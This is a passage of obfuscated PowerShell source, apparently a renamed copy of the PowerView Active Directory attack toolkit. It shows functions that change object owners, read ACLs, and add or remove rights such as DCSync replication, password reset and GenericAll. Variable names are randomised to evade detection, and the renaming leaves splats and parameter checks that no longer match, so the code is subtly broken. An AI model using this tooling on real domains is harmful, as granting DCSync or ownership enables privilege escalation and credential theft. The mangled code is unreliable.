                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $S, $oJjPzTWriNQe, $kCn, $TljZNdaxfgC0mG, $ntUmBihKlAs7pqx, $g3yXZhgPT2ikG
            }

        }
    }
}


function Set-DomainObjectOwner {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $S,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $oft9m1OdYi5cGvrqVL,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        $I1SlGqiPca70pCJ8gbNV = Get-DomainObject @SearcherArguments -S $oft9m1OdYi5cGvrqVL -UtHQ objectsid | Select-Object -ExpandProperty objectsid
        if ($I1SlGqiPca70pCJ8gbNV) {
            $7ZE3GqFQ8oCPHOc1Dqr9za3M = [System.Security.Principal.SecurityIdentifier]$I1SlGqiPca70pCJ8gbNV
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$oft9m1OdYi5cGvrqVL'"
        }
    }

    PROCESS {
        if ($7ZE3GqFQ8oCPHOc1Dqr9za3M) {
            $wtWPex5R['Raw'] = $True
            $wtWPex5R['Identity'] = $S

            
            $1AUZTR = Get-DomainObject @SearcherArguments

            ForEach ($jp9jiurTsXvElqD in $1AUZTR) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$S' to '$oft9m1OdYi5cGvrqVL'"
                    $Fd60Lwl1DIQcXhYvr = $1AUZTR.GetDirectoryEntry()
                    $Fd60Lwl1DIQcXhYvr.PsBase.Options.SecurityMasks = 'Owner'
                    $Fd60Lwl1DIQcXhYvr.PsBase.ObjectSecurity.SetOwner($7ZE3GqFQ8oCPHOc1Dqr9za3M)
                    $Fd60Lwl1DIQcXhYvr.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function Get-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $S,

        [Switch]
        $1OQ6vsduQ49ow91Sqyt5vnzH0,

        [Switch]
        $hLzmeS1K8UtNpyn7Hw,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $3EbF,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $wtWPex5R['SecurityMasks'] = 'Sacl'
        }
        else {
            $wtWPex5R['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $lW1SUjy = Get-DomainSearcher @SearcherArguments

        $N2 = @{}
        if ($PSBoundParameters['Domain']) { $N2['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $N2['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['ResultPageSize']) { $N2['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $N2['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Credential']) { $N2['Credential'] = $3ezVSfm6f4k }

        
        if ($PSBoundParameters['ResolveGUIDs']) {
            $bQWr = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($lW1SUjy) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^S-1-.*') {
                    $CO2KFH += "(objectsid=$It59GzvwEj)"
                }
                elseif ($It59GzvwEj -match '^(CN|OU|DC)=.*') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $lW1SUjy = Get-DomainSearcher @SearcherArguments
                        if (-not $lW1SUjy) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                elseif ($It59GzvwEj -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ypHo7v = (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $CO2KFH += "(objectguid=$ypHo7v)"
                }
                elseif ($It59GzvwEj.Contains('.')) {
                    $CO2KFH += "(|(samAccountName=$It59GzvwEj)(name=$It59GzvwEj)(dnshostname=$It59GzvwEj))"
                }
                else {
                    $CO2KFH += "(|(samAccountName=$It59GzvwEj)(name=$It59GzvwEj)(displayname=$It59GzvwEj))"
                }
            }
            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }

            if ($Iq7bLVAvhKnpjdMlH2) {
                $lW1SUjy.filter = "(&$Iq7bLVAvhKnpjdMlH2)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($lW1SUjy.filter)"

            $nhxRs5G1 = $lW1SUjy.FindAll()
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                $jp9jiurTsXvElqD = $_.Properties

                if ($jp9jiurTsXvElqD.objectsid -and $jp9jiurTsXvElqD.objectsid[0]) {
                    $iQFdt = (New-Object System.Security.Principal.SecurityIdentifier($jp9jiurTsXvElqD.objectsid[0],0)).Value
                }
                else {
                    $iQFdt = $qYFR5PCZruUkdna9T
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $jp9jiurTsXvElqD['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $BtDp0zg52qJnGuqQniG = Switch ($3EbF) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $BtDp0zg52qJnGuqQniG) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $jp9jiurTsXvElqD.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $iQFdt
                                $On5CLdy2vUBu = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $jp9jiurTsXvElqD.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $iQFdt
                            $On5CLdy2vUBu = $True
                        }

                        if ($On5CLdy2vUBu) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($bQWr) {
                                
                                $IPU4bvTJAXFWk0 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $IPU4bvTJAXFWk0[$_.Name] = $bQWr[$_.Value.toString()]
                                        }
                                        catch {
                                            $IPU4bvTJAXFWk0[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $IPU4bvTJAXFWk0[$_.Name] = $_.Value
                                    }
                                }
                                $SJDiUk6RrxMIA4n = New-Object -TypeName PSObject -Property $IPU4bvTJAXFWk0
                                $SJDiUk6RrxMIA4n.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $SJDiUk6RrxMIA4n
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function Add-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $IV8bExmIv1dreDEsWN1Stc,

        [ValidateNotNullOrEmpty()]
        [String]
        $l6OxARucBpbqH124jLlwS,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $9o24ShKZzQ3Ex6g,

        [ValidateNotNullOrEmpty()]
        [String]
        $xQD,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $jw8BoRmaHQ5SphuZ9,

        [ValidateNotNullOrEmpty()]
        [String]
        $U4sT1wb9nxkR2FV,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $4A = 'All',

        [Guid]
        $Ury
    )

    BEGIN {
        $1TCFZ = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $1TCFZ['Domain'] = $l6OxARucBpbqH124jLlwS }
        if ($PSBoundParameters['TargetLDAPFilter']) { $1TCFZ['LDAPFilter'] = $9o24ShKZzQ3Ex6g }
        if ($PSBoundParameters['TargetSearchBase']) { $1TCFZ['SearchBase'] = $xQD }
        if ($PSBoundParameters['Server']) { $1TCFZ['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $1TCFZ['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $1TCFZ['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $1TCFZ['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $1TCFZ['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $1TCFZ['Credential'] = $3ezVSfm6f4k }

        $SbT4EDxHwgCremc1WFfi = @{
            'Identity' = $jw8BoRmaHQ5SphuZ9
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $SbT4EDxHwgCremc1WFfi['Domain'] = $U4sT1wb9nxkR2FV }
        if ($PSBoundParameters['Server']) { $SbT4EDxHwgCremc1WFfi['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $SbT4EDxHwgCremc1WFfi['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $SbT4EDxHwgCremc1WFfi['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $SbT4EDxHwgCremc1WFfi['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $SbT4EDxHwgCremc1WFfi['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $SbT4EDxHwgCremc1WFfi['Credential'] = $3ezVSfm6f4k }
        $cLdQvalystAXw8 = Get-DomainObject @PrincipalSearcherArguments
        if (-not $cLdQvalystAXw8) {
            throw "Unable to resolve principal: $jw8BoRmaHQ5SphuZ9"
        }
    }

    PROCESS {
        $1TCFZ['Identity'] = $IV8bExmIv1dreDEsWN1Stc
        $Tu1HgLa = Get-DomainObject @TargetSearcherArguments

        ForEach ($gmeJ8wNlI6aVtb in $Tu1HgLa) {

            $ntUmBihKlAs7pqx = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $spcKKrXyvf27FBq = [System.Security.AccessControl.AccessControlType] 'Allow'
            $lzByclPh0ApA4nKdmQnj = @()

            if ($Ury) {
                $bQWr = @($Ury)
            }
            else {
                $bQWr = Switch ($4A) {
                    
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    
                    
                    
                    
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($qCRfArv4OFwNH in $cLdQvalystAXw8) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($qCRfArv4OFwNH.distinguishedname) '$4A' on $($gmeJ8wNlI6aVtb.Properties.distinguishedname)"

                try {
                    $S = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$qCRfArv4OFwNH.objectsid)

                    if ($bQWr) {
                        ForEach ($5po0qFi4I in $bQWr) {
                            $Xn5VBRgR1w3KQTAVIUN = New-Object Guid $5po0qFi4I
                            $dEZBpoCDl8FrL = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $lzByclPh0ApA4nKdmQnj += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $S, $dEZBpoCDl8FrL, $spcKKrXyvf27FBq, $Xn5VBRgR1w3KQTAVIUN, $ntUmBihKlAs7pqx
                        }
                    }
                    else {
                        
                        $dEZBpoCDl8FrL = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $lzByclPh0ApA4nKdmQnj += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $S, $dEZBpoCDl8FrL, $spcKKrXyvf27FBq, $ntUmBihKlAs7pqx
                    }

                    
                    ForEach ($3F6l in $lzByclPh0ApA4nKdmQnj) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($qCRfArv4OFwNH.distinguishedname) rights GUID '$($3F6l.ObjectType)' on $($gmeJ8wNlI6aVtb.Properties.distinguishedname)"
                        $9qglnyI7jQXLKxr0ESOu4HYa = $gmeJ8wNlI6aVtb.GetDirectoryEntry()
                        $9qglnyI7jQXLKxr0ESOu4HYa.PsBase.Options.SecurityMasks = 'Dacl'
                        $9qglnyI7jQXLKxr0ESOu4HYa.PsBase.ObjectSecurity.AddAccessRule($3F6l)
                        $9qglnyI7jQXLKxr0ESOu4HYa.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($qCRfArv4OFwNH.distinguishedname) '$4A' on $($gmeJ8wNlI6aVtb.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $IV8bExmIv1dreDEsWN1Stc,

        [ValidateNotNullOrEmpty()]
        [String]
        $l6OxARucBpbqH124jLlwS,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $9o24ShKZzQ3Ex6g,

        [ValidateNotNullOrEmpty()]
        [String]
        $xQD,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $jw8BoRmaHQ5SphuZ9,

        [ValidateNotNullOrEmpty()]
        [String]
        $U4sT1wb9nxkR2FV,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $4A = 'All',

        [Guid]
        $Ury
    )

    BEGIN {
        $1TCFZ = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $1TCFZ['Domain'] = $l6OxARucBpbqH124jLlwS }
        if ($PSBoundParameters['TargetLDAPFilter']) { $1TCFZ['LDAPFilter'] = $9o24ShKZzQ3Ex6g }
        if ($PSBoundParameters['TargetSearchBase']) { $1TCFZ['SearchBase'] = $xQD }
        if ($PSBoundParameters['Server']) { $1TCFZ['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $1TCFZ['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $1TCFZ['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $1TCFZ['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $1TCFZ['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $1TCFZ['Credential'] = $3ezVSfm6f4k }

        $SbT4EDxHwgCremc1WFfi = @{
            'Identity' = $jw8BoRmaHQ5SphuZ9
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $SbT4EDxHwgCremc1WFfi['Domain'] = $U4sT1wb9nxkR2FV }
        if ($PSBoundParameters['Server']) { $SbT4EDxHwgCremc1WFfi['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $SbT4EDxHwgCremc1WFfi['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $SbT4EDxHwgCremc1WFfi['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $SbT4EDxHwgCremc1WFfi['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $SbT4EDxHwgCremc1WFfi['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $SbT4EDxHwgCremc1WFfi['Credential'] = $3ezVSfm6f4k }
        $cLdQvalystAXw8 = Get-DomainObject @PrincipalSearcherArguments
        if (-not $cLdQvalystAXw8) {
            throw "Unable to resolve principal: $jw8BoRmaHQ5SphuZ9"
        }
    }

    PROCESS {
        $1TCFZ['Identity'] = $IV8bExmIv1dreDEsWN1Stc
        $Tu1HgLa = Get-DomainObject @TargetSearcherArguments

        ForEach ($gmeJ8wNlI6aVtb in $Tu1HgLa) {

            $ntUmBihKlAs7pqx = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $spcKKrXyvf27FBq = [System.Security.AccessControl.AccessControlType] 'Allow'
            $lzByclPh0ApA4nKdmQnj = @()

            if ($Ury) {
                $bQWr = @($Ury)
            }
            else {
                $bQWr = Switch ($4A) {
                    
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    
                    
                    
                    
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($qCRfArv4OFwNH in $cLdQvalystAXw8) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($qCRfArv4OFwNH.distinguishedname) '$4A' from $($gmeJ8wNlI6aVtb.Properties.distinguishedname)"

                try {
                    $S = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$qCRfArv4OFwNH.objectsid)

                    if ($bQWr) {
                        ForEach ($5po0qFi4I in $bQWr) {
                            $Xn5VBRgR1w3KQTAVIUN = New-Object Guid $5po0qFi4I
                            $dEZBpoCDl8FrL = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $lzByclPh0ApA4nKdmQnj += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $S, $dEZBpoCDl8FrL, $spcKKrXyvf27FBq, $Xn5VBRgR1w3KQTAVIUN, $ntUmBihKlAs7pqx
                        }
                    }
                    else {
                        
                        $dEZBpoCDl8FrL = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $lzByclPh0ApA4nKdmQnj += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $S, $dEZBpoCDl8FrL, $spcKKrXyvf27FBq, $ntUmBihKlAs7pqx
                    }

                    
                    ForEach ($3F6l in $lzByclPh0ApA4nKdmQnj) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($qCRfArv4OFwNH.distinguishedname) rights GUID '$($3F6l.ObjectType)' on $($gmeJ8wNlI6aVtb.Properties.distinguishedname)"
                        $9qglnyI7jQXLKxr0ESOu4HYa = $gmeJ8wNlI6aVtb.GetDirectoryEntry()
                        $9qglnyI7jQXLKxr0ESOu4HYa.PsBase.Options.SecurityMasks = 'Dacl'
                        $9qglnyI7jQXLKxr0ESOu4HYa.PsBase.ObjectSecurity.RemoveAccessRule($3F6l)
                        $9qglnyI7jQXLKxr0ESOu4HYa.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($qCRfArv4OFwNH.distinguishedname) '$4A' from $($gmeJ8wNlI6aVtb.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $3Ecdwi8qNy,

        [Switch]
        $hLzmeS1K8UtNpyn7Hw,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $3EbF,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UcDG = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $UcDG['ResolveGUIDs'] = $hLzmeS1K8UtNpyn7Hw }
        if ($PSBoundParameters['RightsFilter']) { $UcDG['RightsFilter'] = $3EbF }
        if ($PSBoundParameters['LDAPFilter']) { $UcDG['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $UcDG['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $UcDG['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $UcDG['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $UcDG['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $UcDG['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $UcDG['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $UcDG['Credential'] = $3ezVSfm6f4k }

        $5cU = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $5cU['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $5cU['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $5cU['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $5cU['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $5cU['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $5cU['Credential'] = $3ezVSfm6f4k }

        $iA8aCAaRdB = @{}
        if ($PSBoundParameters['Server']) { $iA8aCAaRdB['Server'] = $Gkd0Hz5f }
